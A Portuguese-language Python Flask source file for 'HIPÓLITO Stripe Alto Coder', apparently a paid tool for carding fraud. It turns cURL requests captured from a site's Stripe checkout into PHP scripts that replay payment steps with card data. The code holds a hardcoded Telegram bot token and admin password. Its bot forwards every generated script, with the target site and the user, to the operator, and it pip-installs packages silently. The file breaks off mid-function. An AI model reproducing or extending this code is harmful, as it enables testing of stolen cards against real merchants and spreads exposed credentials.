# hipolito_stripe.py — HIPÓLITO Stripe — Alto Coder Professional v6.0
# Rodar: python hipolito_stripe.py
import os, sys, json, time, uuid, re, random, secrets, threading, io, shlex
from datetime import datetime
from collections import OrderedDict
from functools import wraps
from urllib.parse import unquote

def install(pkg):
    try: __import__(pkg.replace('-','_').replace('.','_'))
    except: os.system(f"{sys.executable} -m pip install {pkg} --quiet 2>nul")

for d in ['flask','flask-cors','werkzeug','requests','colorama']:
    install(d)

from flask import Flask, request, jsonify, session, redirect, url_for, render_template_string
from flask_cors import CORS
import requests as http_requests
from colorama import init, Fore, Style
init(autoreset=True)

# ========== CONFIG ==========
PORT = int(os.environ.get('PORT', 5000))
BASE_URL = os.environ.get('RENDER_EXTERNAL_URL', f'http://localhost:{PORT}')
BOT_TOKEN = "8952767112:AAGsG1yxraZXY0IkZ3QmIGu5_jfTXhhhGas"
ADMIN_ID = 8617449427
ADMIN_PASSWORD = "hipolito"
TELEGRAM_CHANNEL = "https://t.me/hipolitoofc"
ADMIN_TAG = "@hipolitoofc"
API_STORAGE = "apis_criadas.json"

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(64)
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['PERMANENT_SESSION_LIFETIME'] = 60 * 60 * 24 * 7
CORS(app, resources={r"/api/*": {"origins": "*"}})
os.makedirs('scripts_gerados', exist_ok=True)

# ========== KEYS (base64) ==========
KEYS_RAW = json.loads(__import__('base64').b64decode(
    "eyJjeWJlciI6IHsidXNlciI6ICJAaGlwb2xpdG9vZmMiLCAicGxhbm8iOiAiUFJPIiwgImV4cGlyYWNhbyI6ICIxNC8wNy8yMDI4IiwgInN0YXR1cyI6ICJhdGl2byJ9fQ=="
).decode('utf-8'))

# ========== RATE LIMIT ==========
_rate = {}
def rate_limit(max_req=8, window=60):
    def deco(f):
        @wraps(f)
        def wrap(*a, **kw):
            ip = request.remote_addr or 'x'
            now = time.time()
            hits = [t for t in _rate.get(ip, []) if now - t < window]
            if len(hits) >= max_req:
                return jsonify({'status': 'error', 'message': 'Muitas requisições. Aguarde.'}), 429
            hits.append(now)
            _rate[ip] = hits
            return f(*a, **kw)
        return wrap
    return deco

# ========== STORAGE ==========
def load_apis():
    if os.path.exists(API_STORAGE):
        try: return json.load(open(API_STORAGE, 'r', encoding='utf-8'))
        except: return []
    return []

def save_apis(data):
    with open(API_STORAGE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

# ========== TELEGRAM ==========
def tg_send(text, chat_id=ADMIN_ID):
    try:
        http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'},
            timeout=10
        )
    except Exception as e:
        print(f"[TG MSG ERR] {e}")

def tg_send_doc(file_bytes, filename, caption, chat_id=ADMIN_ID):
    try:
        http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
            data={'chat_id': chat_id, 'caption': caption[:1000]},
            files={'document': (filename, io.BytesIO(file_bytes), 'text/x-php')},
            timeout=30
        )
    except Exception as e:
        print(f"[TG DOC ERR] {e}")

def tg_polling():
    offset = 0
    while True:
        try:
            r = http_requests.get(
                f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
                params={'offset': offset, 'timeout': 30},
                timeout=40
            ).json()
            if not r.get('ok'):
                time.sleep(5); continue
            for upd in r.get('result', []):
                offset = upd['update_id'] + 1
                msg = upd.get('message')
                if not msg: continue
                chat_id = msg['chat']['id']
                if str(chat_id) != str(ADMIN_ID):
                    continue
                txt = (msg.get('text') or '').strip()
                if txt == '/api':
                    apis = load_apis()
                    if not apis:
                        tg_send("❌ Nenhuma API criada ainda.", chat_id); continue
                    last = apis[-1]
                    tg_send_doc(
                        last.get('code','').encode('utf-8'),
                        last.get('filename', 'api.php'),
                        f"🔹 <b>ÚLTIMA API</b>\nArquivo: <code>{last.get('filename','?')}</code>\nSite: <code>{last.get('site','?')}</code>\nData: {last.get('data','?')}\nUser: <code>{last.get('user','?')}</code>\nReq: {last.get('requests_count', '?')}",
                        chat_id
                    )
                elif txt == '/apis':
                    apis = load_apis()
                    if not apis:
                        tg_send("❌ Nenhuma API criada ainda.", chat_id); continue
                    tg_send(f"📦 <b>{len(apis)} API(s)</b>\nEnviando todas...", chat_id)
                    for a in apis:
                        tg_send_doc(
                            a.get('code','').encode('utf-8'),
                            a.get('filename', 'api.php'),
                            f"🔹 <code>{a.get('filename','?')}</code>\nSite: <code>{a.get('site','?')}</code>\nData: {a.get('data','?')}\nUser: <code>{a.get('user','?')}</code>",
                            chat_id
                        )
                        time.sleep(1)
                elif txt == '/start':
                    tg_send(
                        "🤖 <b>HIPÓLITO STRIPE BOT</b>\n\n"
                        "Comandos:\n"
                        "/api - Última API criada\n"
                        "/apis - Todas as APIs\n"
                        "/status - Status do servidor",
                        chat_id
                    )
                elif txt == '/status':
                    apis = load_apis()
                    tg_send(f"✅ Online\n📦 APIs: {len(apis)}\n🌐 {BASE_URL}", chat_id)
        except Exception as e:
            print(f"[TG POLL ERR] {e}")
            time.sleep(5)

# ============================================================
# LOGIN PAGE
# ============================================================
LOGIN_PAGE = r'''<!DOCTYPE html>
<html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>HIPÓLITO Stripe | Login</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>
:root{--g:#00ff88;--g2:#00cc66;--r:#ff3355;--t:#e8e8f5;--t2:#8888bb;--t3:#555577;--glass:rgba(8,8,20,.7);--gb:rgba(255,255,255,.08)}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;min-height:100vh;background:#050510;display:flex;align-items:center;justify-content:center;overflow:hidden}
.bg-img{position:fixed;inset:0;background:#050510 center/cover no-repeat;z-index:0}
.bg-ov{position:fixed;inset:0;background:rgba(0,0,0,.65);backdrop-filter:blur(5px);z-index:1}
.lc{position:relative;z-index:2;width:90%;max-width:430px;animation:up .7s cubic-bezier(.34,1.56,.64,1)}
@keyframes up{from{opacity:0;transform:translateY(50px) scale(.93)}to{opacity:1;transform:translateY(0) scale(1)}}
.lcard{background:var(--glass);backdrop-filter:blur(25px);border:1px solid var(--gb);border-radius:28px;padding:45px 35px 40px;text-align:center;box-shadow:0 30px 80px rgba(0,0,0,.6)}
.llogo{width:70px;height:70px;margin:0 auto 20px;background:linear-gradient(135deg,#00ff88,#00cc66);border-radius:20px;display:flex;align-items:center;justify-content:center;font-size:2em;box-shadow:0 15px 40px rgba(0,255,136,.35);animation:pulse 2.5s infinite}
@keyframes pulse{0%,100%{box-shadow:0 15px 40px rgba(0,255,136,.35)}50%{box-shadow:0 15px 60px rgba(0,255,136,.55)}}
.lcard h1{font-family:'Orbitron',sans-serif;font-size:2em;font-weight:900;letter-spacing:3px;margin-bottom:5px;background:linear-gradient(135deg,#fff 30%,#b0b0c0);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.lcard .sub{font-size:.78em;color:var(--t3);margin-bottom:28px;letter-spacing:3px;text-transform:uppercase;font-weight:500}
.lcard input{width:100%;padding:15px 16px;border:1.5px solid rgba(255,255,255,.06);border-radius:16px;background:rgba(255,255,255,.03);color:#fff;font-size:.95em;text-align:center;letter-spacing:1.5px;outline:none;transition:.3s}
.lcard input:focus{border-color:var(--g);background:rgba(0,255,136,.04);box-shadow:0 0 35px rgba(0,255,136,.1)}
.lcard button{width:100%;padding:15px;margin-top:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#00ff88,#00cc66);color:#000;font-size:1em;font-weight:700;cursor:pointer;transition:.4s;letter-spacing:1px}
.lcard button:hover{transform:translateY(-3px);box-shadow:0 15px 45px rgba(0,255,136,.45)}
.lerr{color:#ff5252;margin-top:14px;font-size:.8em;display:none;padding:10px 14px;background:rgba(255,51,85,.08);border-radius:12px;border:1px solid rgba(255,51,85,.2)}
.lerr.show{display:block}
.lfoot{margin-top:20px;font-size:.7em;color:var(--t3);letter-spacing:1px}
.lfoot a{color:var(--g);text-decoration:none;font-weight:600}
@media(max-width:500px){.lcard{padding:30px 22px}.lcard h1{font-size:1.5em}.llogo{width:55px;height:55px;font-size:1.5em}}
</style></head><body>
<div class="bg-img"></div><div class="bg-ov"></div>
<div class="lc"><div class="lcard">
<div class="llogo">⚡</div>
<h1>HIPÓLITO</h1>
<p class="sub">Stripe Alto Coder v6.0</p>
<form method="POST" action="/login" onsubmit="return validate()">
<input type="password" id="ki" name="key" placeholder="DIGITE SUA KEY DE ACESSO" autocomplete="off" required autofocus>
<button type="submit">🚀 ACESSAR SISTEMA</button>
</form>
<div class="lerr" id="err"></div>
<div class="lfoot">© 2024 <a href="https://t.me/hipolitoofc" target="_blank">@hipolitoofc</a> | Acesso Restrito</div>
</div></div>
<iframe id="yt" width="0" height="0" src="https://www.youtube.com/embed/75bCm-EDnpk?autoplay=1&loop=1&playlist=75bCm-EDnpk&controls=0&showinfo=0&rel=0&iv_load_policy=3&mute=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen style="position:fixed;bottom:0;right:0;z-index:-1;opacity:0;pointer-events:none"></iframe>
<script>
const u=new URLSearchParams(location.search),e=u.get('error'),d=document.getElementById('err');
if(e){d.textContent=e==='invalid_key'?'⚠️ Key inválida!':e==='desativado'?'⛔ Key desativada!':e==='empty'?'⚠️ Digite uma key!':'⚠️ '+decodeURIComponent(e);d.classList.add('show');}
function validate(){if(!document.getElementById('ki').value.trim()){d.textContent='⚠️ Digite uma key!';d.classList.add('show');return false}return true}
document.addEventListener('click',function(){const i=document.getElementById('yt');if(i&&i.src.indexOf('autoplay=1')===-1)i.src=i.src.replace('autoplay=0','autoplay=1')},{once:true});
</script></body></html>'''

# ============================================================
# MAIN APP PAGE
# ============================================================
APP_PAGE = r'''<!DOCTYPE html>
<html lang="pt-BR"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>HIPÓLITO Stripe | Alto Coder v6.0</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Share+Tech+Mono&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>
:root{--bg:#050510;--s:#0a0a1a;--s2:#0f0f25;--b:#1a1a3a;--bh:#2a2a5a;--g:#00ff88;--g2:#00cc66;--bl:#3399ff;--pu:#8844ff;--r:#ff3355;--y:#ffaa00;--t:#e8e8f5;--t2:#8888bb;--t3:#555577;--gm:linear-gradient(135deg,#00ff88,#00ddff,#8844ff)}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--t);font-family:'Inter',sans-serif;min-height:100vh;background-image:radial-gradient(ellipse at 15% 40%,rgba(0,255,136,.05) 0%,transparent 55%),radial-gradient(ellipse at 85% 25%,rgba(51,153,255,.05) 0%,transparent 55%),radial-gradient(ellipse at 50% 85%,rgba(136,68,255,.05) 0%,transparent 55%);background-attachment:fixed}
body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,255,136,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,.02) 1px,transparent 1px);background-size:60px 60px;pointer-events:none;z-index:0;animation:gm 20s linear infinite}
@keyframes gm{0%{background-position:0 0,0 0}100%{background-position:60px 60px,60px 60px}}
.app{position:relative;z-index:1;max-width:1100px;margin:0 auto;padding:20px}
.header{text-align:center;padding:30px 20px 25px}
.logo-icon{font-size:50px;display:block;animation:fl 3s ease-in-out infinite;filter:drop-shadow(0 0 20px rgba(0,255,136,.5));margin-bottom:10px}
@keyframes fl{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
.logo-text{font-family:'Orbitron',sans-serif;font-size:2.8em;font-weight:900;letter-spacing:4px;background:var(--gm);-webkit-background-clip:text;-webkit-text-fill-color:transparent;line-height:1.2}
.vbadge{display:inline-block;background:rgba(0,255,136,.1);border:1px solid rgba(0,255,136,.3);color:var(--g);padding:4px 12px;border-radius:15px;font-size:.65em;font-weight:700;letter-spacing:2px;vertical-align:super;margin-left:5px}
.sub{font-family:'Share Tech Mono',monospace;color:var(--t3);letter-spacing:3px;font-size:.8em;margin-top:5px}
.ubar{display:inline-flex;align-items:center;gap:10px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.08);border-radius:50px;padding:8px 20px;margin-top:12px;font-size:.8em;color:var(--t2)}
.ubar .dot{width:8px;height:8px;border-radius:50%;background:var(--g);box-shadow:0 0 10px rgba(0,255,136,.5)}
.lout{color:var(--r);text-decoration:none;font-weight:600;margin-left:10px}
.badge-row{display:flex;justify-content:center;gap:10px;margin-top:15px;flex-wrap:wrap}
.badge{padding:6px 16px;border-radius:25px;font-size:.7em;font-weight:600;letter-spacing:1.5px;text-transform:uppercase}
.bg-g{background:rgba(0,255,136,.08);border:1px solid rgba(0,255,136,.25);color:var(--g);box-shadow:0 0 15px rgba(0,255,136,.1)}
.bg-b{background:rgba(51,153,255,.08);border:1px solid rgba(51,153,255,.25);color:var(--bl);box-shadow:0 0 15px rgba(51,153,255,.1)}
.bg-p{background:rgba(136,68,255,.08);border:1px solid rgba(136,68,255,.25);color:var(--pu);box-shadow:0 0 15px rgba(136,68,255,.1)}
.tg-btn{display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,#0088cc,#006699);color:#fff;padding:8px 18px;border-radius:25px;text-decoration:none;font-weight:600;font-size:.8em;letter-spacing:1px;transition:.3s;margin-top:12px;border:1px solid rgba(255,255,255,.2)}
.tg-btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(0,136,204,.4)}
.mc{background:var(--s);border:1px solid var(--b);border-radius:24px;padding:30px;box-shadow:0 25px 80px rgba(0,0,0,.5)}
.ch{display:flex;align-items:center;gap:12px;margin-bottom:10px;flex-wrap:wrap}
.ci{width:42px;height:42px;background:linear-gradient(135deg,rgba(0,255,136,.2),rgba(0,221,255,.2));border:1px solid rgba(0,255,136,.3);border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:1.2em;flex-shrink:0}
.ct{font-size:1.2em;font-weight:700}
.cd{color:var(--t2);font-size:.85em;margin-bottom:20px;line-height:1.5}
.tw{position:relative}
textarea{width:100%;min-height:280px;background:var(--bg);border:2px solid var(--b);border-radius:16px;padding:18px;color:var(--g);font-family:'Share Tech Mono',monospace;font-size:.8em;line-height:1.7;resize:vertical;outline:none;transition:.4s}
textarea:focus{border-color:var(--g);box-shadow:0 0 0 5px rgba(0,255,136,.06)}
textarea::placeholder{color:#1f1f40;font-style:italic}
.tcnt{position:absolute;bottom:12px;right:18px;font-family:'Share Tech Mono',monospace;font-size:.65em;color:var(--t3);background:rgba(0,0,0,.6);padding:4px 10px;border-radius:10px}
.btn-row{display:flex;gap:12px;margin-top:20px;flex-wrap:wrap}
.btn{padding:14px 28px;border:none;border-radius:14px;font-size:.9em;font-weight:700;letter-spacing:1.5px;cursor:pointer;transition:.3s;display:flex;align-items:center;gap:8px;text-transform:uppercase}
.btn-p{background:linear-gradient(135deg,var(--g),var(--g2));color:#000;box-shadow:0 0 30px rgba(0,255,136,.4);flex:1;justify-content:center;font-size:.95em;animation:pu 2s infinite}
.btn-p:hover{transform:translateY(-3px);box-shadow:0 15px 45px rgba(0,255,136,.5)}
@keyframes pu{0%,100%{box-shadow:0 0 0 0 rgba(0,255,136,.4)}50%{box-shadow:0 0 0 15px rgba(0,255,136,0)}}
.btn-s{background:transparent;border:2px solid var(--b);color:var(--t2)}
.btn-s:hover{border-color:var(--r);color:var(--r);transform:translateY(-2px)}
.results{margin-top:25px;display:none}
.results.show{display:block;animation:fu .5s cubic-bezier(.16,1,.3,1)}
@keyframes fu{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
.rc{background:var(--s2);border:1px solid var(--b);border-radius:16px;padding:20px;margin-bottom:12px;transition:.3s}
.rc:hover{border-color:var(--bh)}
.rc.success{border-left:4px solid var(--g)}
.rc.error{border-left:4px solid var(--r)}
.rc.info{border-left:4px solid var(--bl)}
.rc.code{border-left:4px solid var(--pu)}
.rc.warn{border-left:4px solid var(--y)}
.tag{display:inline-block;padding:5px 14px;border-radius:20px;font-size:.75em;font-weight:700;letter-spacing:1px;margin-bottom:10px}
.tag-g{background:rgba(0,255,136,.12);color:var(--g)}
.tag-r{background:rgba(255,51,85,.12);color:var(--r)}
.tag-b{background:rgba(51,153,255,.12);color:var(--bl)}
.tag-p{background:rgba(136,68,255,.12);color:var(--pu)}
.tag-y{background:rgba(255,170,0,.12);color:var(--y)}
.step-list{list-style:none;margin-top:10px}
.step-item{display:flex;align-items:center;gap:10px;padding:10px 12px;background:var(--bg);border-radius:10px;margin-bottom:5px;font-size:.8em;flex-wrap:wrap;transition:.2s;border:1px solid transparent}
.step-item:hover{border-color:var(--b);background:#08081a}
.step-num{width:28px;height:28px;background:var(--s2);border:2px solid var(--b);border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.75em;color:var(--g);flex-shrink:0}
.mt{padding:2px 8px;border-radius:5px;font-family:'Share Tech Mono',monospace;font-size:.65em;font-weight:700;letter-spacing:1px;flex-shrink:0}
.mt-POST{background:rgba(0,255,136,.12);color:var(--g)}
.mt-GET{background:rgba(51,153,255,.12);color:var(--bl)}
.mt-PUT{background:rgba(255,170,0,.12);color:var(--y)}
.step-info{flex:1;min-width:150px}
.step-url{color:var(--t3);word-break:break-all;font-size:.82em;font-family:'Share Tech Mono',monospace}
.step-purpose{color:var(--y);font-size:.68em;text-transform:uppercase;letter-spacing:1.5px;font-weight:700;flex-shrink:0;background:rgba(255,170,0,.08);padding:3px 8px;border-radius:15px}
.code-block{background:#000;padding:16px;border-radius:12px;font-family:'Share Tech Mono',monospace;font-size:.75em;color:var(--g);margin-top:10px;word-break:break-all;overflow-x:auto;max-height:400px;overflow-y:auto;border:1px solid var(--b);line-height:1.6;white-space:pre-wrap}
.code-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;flex-wrap:wrap;gap:10px}
.code-actions{display:flex;gap:8px;flex-wrap:wrap}
.btn-sm{padding:8px 16px;border:none;border-radius:8px;font-size:.75em;font-weight:600;letter-spacing:1px;cursor:pointer;transition:.3s;text-transform:uppercase}
.btn-sm-copy{background:var(--bl);color:#fff}
.btn-sm-copy:hover{background:#0066cc}
.btn-sm-dl{background:var(--pu);color:#fff}
.btn-sm-dl:hover{background:#6622cc}
.loader{display:flex;align-items:center;justify-content:center;gap:12px;padding:40px}
.spinner{width:28px;height:28px;border:3px solid var(--b);border-top-color:var(--g);border-radius:50%;animation:sp .7s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
.loader-text{color:var(--t2);font-weight:500}
.toast{position:fixed;top:20px;right:20px;padding:14px 24px;border-radius:14px;color:#fff;font-weight:700;z-index:9999;animation:ti .4s cubic-bezier(.16,1,.3,1);max-width:90vw;font-size:.85em;box-shadow:0 15px 40px rgba(0,0,0,.5)}
.toast-success{background:#00cc66}
.toast-error{background:#ff3355}
@keyframes ti{from{opacity:0;transform:translateX(120px) scale(.9)}to{opacity:1;transform:translateX(0) scale(1)}}
.footer{text-align:center;padding:25px;color:var(--t3);font-size:.75em;letter-spacing:1px}
.footer a{color:var(--g);text-decoration:none;font-weight:600}
.fdiv{width:50px;height:2px;background:var(--gm);margin:12px auto;border-radius:10px}
.info-box{background:rgba(51,153,255,.06);border:1px solid rgba(51,153,255,.2);border-radius:10px;padding:12px;font-size:.8em;color:var(--t2);margin-top:10px}
.info-box b{color:var(--bl)}
@media(max-width:768px){.app{padding:10px}.header{padding:20px 10px}.logo-text{font-size:1.8em;letter-spacing:3px}.logo-icon{font-size:35px}.mc{padding:18px}.btn-row{flex-direction:column}.btn{width:100%;justify-content:center}textarea{min-height:220px;font-size:.7em}.toast{top:10px;right:10px;left:10px;max-width:none}}
</style></head><body>
<div class="app">
<div class="header">
<span class="logo-icon">⚡</span>
<div class="logo-text">HIPÓLITO<span class="vbadge">v6.0</span></div>
<div class="sub">STRIPE ALTO CODER PROFESSIONAL</div>
<div class="ubar"><span class="dot"></span><span id="ud">USER</span><a href="/logout" class="lout">🚪 SAIR</a></div>
<div class="badge-row">
<span class="badge bg-g">🔒 Stripe API</span>
<span class="badge bg-b">🧠 Auto Detect</span>
<span class="badge bg-p">🎯 Smart Order</span>
</div>
<a href="https://t.me/hipolitoofc" target="_blank" class="tg-btn">📢 Canal Telegram</a>
</div>

<div class="mc">
<div class="ch"><div class="ci">📋</div><div><div class="ct">Cole seus cURLs do Stripe</div>
<div class="cd">Suporte ilimitado. O sistema <b>deduplica</b>, <b>ordena por dependência</b>, <b>detecta se precisa criar conta ou reusar</b>, identifica <b>carrinho/checkout</b>, extrai tokens automaticamente e ignora requests de tracking.</div></div></div>
<div class="tw">
<textarea id="ci" placeholder="Cole aqui seus cURLs..."></textarea>
<span class="tcnt" id="cc">0 caracteres</span>
</div>
<div class="btn-row">
<button class="btn btn-p" onclick="gen()">⚡ GERAR API AGORA</button>
<button class="btn btn-s" onclick="clr()">🗑️ LIMPAR TUDO</button>
</div>
<div class="results" id="results"><div id="rc"></div></div>
</div>

<div class="footer">
<div class="fdiv"></div>
© 2024 <a href="https://t.me/hipolitoofc" target="_blank">HIPÓLITO Stripe</a> | Alto Coder Professional | @hipolitoofc
<br><span style="font-size:.85em;color:var(--t3)">Ctrl + Enter para gerar</span>
</div>
</div>
<iframe id="yt" width="0" height="0" src="https://www.youtube.com/embed/75bCm-EDnpk?autoplay=1&loop=1&playlist=75bCm-EDnpk&controls=0&showinfo=0&rel=0&iv_load_policy=3&mute=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen style="position:fixed;bottom:0;right:0;z-index:-1;opacity:0;pointer-events:none"></iframe>
<script>
const U={user:'USER_PLACEHOLDER',plano:'PLANO_PLACEHOLDER',exp:'EXP_PLACEHOLDER'};
document.getElementById('ud').textContent=U.user+' | 💎 '+U.plano+' | 📅 '+U.exp;
const ta=document.getElementById('ci'),cc=document.getElementById('cc');
ta.addEventListener('input',()=>{const l=ta.value.length;cc.textContent=l+' caracteres';cc.style.color=l>10000?'#ff3355':'#555577'});
function toast(m,t){const e=document.createElement('div');e.className='toast toast-'+t;e.textContent=m;document.body.appendChild(e);setTimeout(()=>{e.style.opacity='0';e.style.transform='translateX(120px)';e.style.transition='all .3s';setTimeout(()=>e.remove(),300)},3500)}
let SC='',SF='';
async function gen(){
const c=document.getElementById('ci').value;
if(!c.trim()){toast('⚠️ Cole seus cURLs primeiro!','error');return}
const r=document.getElementById('results'),rc=document.getElementById('rc');
r.classList.add('show');
rc.innerHTML='<div class="rc info"><div class="loader"><div class="spinner"></div><span class="loader-text">Analisando, deduplicando e ordenando cURLs...</span></div></div>';
r.scrollIntoView({behavior:'smooth',block:'center'});
try{
const resp=await fetch('/api/generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({curls:c})});
const d=await resp.json();
if(d.status==='success'){SC=d.php_code;SF=d.filename;showRes(d);toast('✅ API gerada! '+d.total_requests+' req processadas.','success')}
else{showErr(d.message);toast('❌ '+d.message,'error')}
}catch(e){showErr('Erro de conexão: '+e.message);toast('❌ Erro de conexão','error')}
}
function showRes(d){
const rc=document.getElementById('rc');
let steps='';
d.requests.forEach((r,i)=>{steps+='<div class="step-item"><div class="step-num">'+(i+1)+'</div><span class="mt mt-'+r.method+'">'+r.method+'</span><div class="step-info"><div class="step-url">'+esc(r.url.substring(0,70))+'...</div></div><span class="step-purpose">'+r.purpose+'</span></div>'});
let analysis='';
if(d.analysis){
analysis+='<div class="rc info"><span class="tag tag-b">🧠 ANÁLISE INTELIGENTE</span>';
analysis+='<div class="info-box"><b>Conta:</b> '+d.analysis.account_mode+'<br>';
analysis+='<b>Carrinho:</b> '+(d.analysis.has_cart?'Sim ('+d.analysis.cart_items+' itens)':'Não')+'<br>';
analysis+='<b>Checkout:</b> '+(d.analysis.has_checkout?'Sim':'Não')+'<br>';
analysis+='<b>Tokens detectados:</b> '+(d.analysis.tokens.length?d.analysis.tokens.join(', '):'Nenhum')+'<br>';
analysis+='<b>Requests ignorados:</b> '+d.analysis.skipped+' (tracking/preflight)</div></div>';
}
rc.innerHTML='<div class="rc success"><span class="tag tag-g">✅ API GERADA COM SUCESSO</span><div>'+d.message+'</div></div>'
+'<div class="rc info"><span class="tag tag-b">📋 '+d.total_requests+' REQUISIÇÕES PROCESSADAS</span><div class="step-list">'+steps+'</div></div>'
+analysis
+'<div class="rc code"><div class="code-header"><span class="tag tag-p">📄 CÓDIGO PHP GERADO</span><div class="code-actions"><button class="btn-sm btn-sm-copy" onclick="cp()">📋 COPIAR</button><button class="btn-sm btn-sm-dl" onclick="dl()">💾 BAIXAR</button></div></div><div class="code-block">'+esc(d.php_code)+'</div></div>';
rc.scrollIntoView({behavior:'smooth',block:'center'});
}
function showErr(m){document.getElementById('rc').innerHTML='<div class="rc error"><span class="tag tag-r">❌ ERRO</span><div>'+esc(m)+'</div></div>'}
function cp(){if(!SC){toast('❌ Nada pra copiar','error');return}if(navigator.clipboard)navigator.clipboard.writeText(SC).then(()=>toast('✅ Copiado!','success')).catch(()=>fb());else fb()}
function fb(){const t=document.createElement('textarea');t.value=SC;t.style.position='fixed';t.style.left='-9999px';document.body.appendChild(t);t.select();try{document.execCommand('copy');toast('✅ Copiado!','success')}catch(e){toast('❌ Falha','error')}document.body.removeChild(t)}
function dl(){if(!SC){toast('❌ Nada pra baixar','error');return}const b=new Blob([SC],{type:'text/php'});const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download=SF||'api.php';document.body.appendChild(a);a.click();document.body.removeChild(a);URL.revokeObjectURL(u);toast('✅ Download!','success')}
function clr(){document.getElementById('ci').value='';document.getElementById('results').classList.remove('show');document.getElementById('rc').innerHTML='';document.getElementById('cc').textContent='0 caracteres';SC='';SF='';toast('🗑️ Limpo!','success')}
function esc(t){if(!t)return'';const d=document.createElement('div');d.textContent=t;return d.innerHTML}
document.addEventListener('keydown',e=>{if((e.ctrlKey||e.metaKey)&&e.key==='Enter'){e.preventDefault();gen()}});
document.addEventListener('click',function(){const i=document.getElementById('yt');if(i&&i.src.indexOf('autoplay=1')===-1)i.src=i.src.replace('autoplay=0','autoplay=1')},{once:true});
</script></body></html>'''

# ============================================================
# PARSER DE cURL (melhorado)
# ============================================================
def parse_curl(curl_str):
    curl_str = ' '.join(curl_str.strip().split())
    try:
        parts = shlex.split(curl_str, posix=True)
    except Exception:
        parts = curl_str.split()

    if not parts or parts[0] != 'curl':
        return None

    idx = 1
    method = 'GET'
    url = ''
    headers = OrderedDict()
    data = ''
    compressed = False
    use_cookie_jar = True

    while idx < len(parts):
        a = parts[idx]
        if a in ('-X', '--request'):
            idx += 1
            if idx < len(parts): method = parts[idx].upper()
        elif a in ('--data-binary', '-d', '--data', '--data-raw', '--data-urlencode'):
            idx += 1
            if idx < len(parts):
                chunk = parts[idx]
                data = (data + '&' + chunk) if data else chunk
                if method == 'GET': method = 'POST'
        elif a == '--compressed':
            compressed = True
        elif a in ('-H', '--header'):
            idx += 1
            if idx < len(parts):
                line = parts[idx]
                if ':' in line:
                    k, v = line.split(':', 1)
                    headers[k.strip().lower()] = v.strip()
        elif a in ('-b', '--cookie'):
            idx += 1
            if idx < len(parts):
                ck = parts[idx]
                headers['cookie'] = ck.strip()
        elif a in ('-A', '--user-agent'):
            idx += 1
            if idx < len(parts): headers['user-agent'] = parts[idx]
        elif a.startswith('http'):
            url = a
        idx += 1

    if not url:
        for p in parts:
            if p.startswith('http'):
                url = p; break

    return {
        'method': method, 'url': url, 'headers': headers,
        'data': data, 'compressed': compressed,
        'use_cookie_jar': use_cookie_jar,
    }

# ============================================================
# ANÁLISE INTELIGENTE
# ============================================================
SKIP_PATTERNS = [
    r'google-analytics\.com', r'googletagmanager\.com', r'facebook\.com/tr',
    r'doubleclick\.net', r'hotjar\.com', r'segment\.(io|com)',
    r'mixpanel\.com', r'amplitude\.com', r'sentry\.io',
    r'preflight', r'\.(png|jpg|jpeg|gif|svg|webp|ico|woff2?|ttf)($|\?)',
    r'fonts\.googleapis\.com', r'cdn\.jsdelivr\.net', r'unpkg\.com',
]

def is_tracking_or_static(url, method):
    if method == 'OPTIONS':
        return True
    for pat in SKIP_PATTERNS:
        if re.search(pat, url, re.I):
            return True
    return False

def analyze_request(parsed):
    url = parsed['url']
    data = parsed['data']
    method = parsed['method']

    a = {
        'type': 'REQUEST', 'category': 'generic', 'importance': 5,
        'extracts_token': False, 'needs_token': False, 'token_type': None,
        'has_card_data': False, 'is_stripe_api': False, 'is_site_request': False,
        'is_signup': False, 'is_login': False, 'is_cart_add': False,
        'is_cart_view': False, 'is_checkout': False, 'is_payment': False,
        'skip': False,
    }

    if is_tracking_or_static(url, method):
        a['skip'] = True
        return a

    # Stripe API
    if 'api.stripe.com' in url:
        a['is_stripe_api'] = True
        if '/v1/payment_methods' in url:
            a.update(type='CREATE_PM', importance=10, extracts_token=True,
                     token_type='pm', has_card_data=True)
        elif '/v1/payment_intents' in url:
            a.update(type='PAYMENT_INTENT', importance=9)
            if method == 'POST':
                a.update(needs_token=True, token_type='pm', is_payment=True)
        elif '/v1/tokens' in url:
            a.update(type='CREATE_TOKEN', importance=10, extracts_token=True,
                     token_type='tok', has_card_data=True)
        elif '/v1/setup_intents' in url:
            a.update(type='SETUP_INTENT', importance=8)
        elif '/v1/confirm' in url:
            a.update(type='CONFIRM', importance=9, needs_token=True,
                     token_type='pi', is_payment=True)
        elif '/v1/charges' in url:
            a.update(type='CHARGE', importance=9, needs_token=True,
